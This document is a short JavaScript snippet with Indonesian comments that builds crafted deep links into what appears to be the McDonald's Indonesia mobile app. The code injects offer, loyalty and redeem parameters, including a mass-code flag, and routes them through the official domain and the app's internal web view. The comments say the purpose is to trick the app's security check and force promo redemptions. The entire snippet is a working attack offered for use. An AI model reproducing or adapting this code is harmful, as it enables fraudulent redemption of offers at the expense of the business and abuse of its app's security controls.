<script>
function gas() { 
    var o = document.getElementById('o').value; 
    var l = document.getElementById('l').value; 
    
    if(!o || !l) return alert("Isi ID!"); 

    // 1. Susun Parameter Injeksi
    var payload = "offer_id=" + o + 
                  "&loyalty_id=" + l + 
                  "&view=claim" + 
                  "&action=redeem" + 
                  "&is_mass_code=1" + 
                  "&is_native=true";

    // 2. TEKNIK PROXY MUKIDI:
    // Kita pancing aplikasi dengan domain mcdonalds.co.id 
    // agar sistem keamanan (Smartweb) mengizinkan eksekusi link.
    var gateway = "https://www.mcdonalds.co.id/promo/details?" + payload;

    // 3. Eksekusi melalui Smartweb Internal
    // Ini akan menipu aplikasi seolah-olah kamu sedang membuka promo resmi
    window.location.href = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(gateway);

    // 4. Force Trigger (Pemicu Paksa)
    setTimeout(function() {
        window.location.href = "gmalite://offers/details?" + payload;
    }, 500);
}
</script>
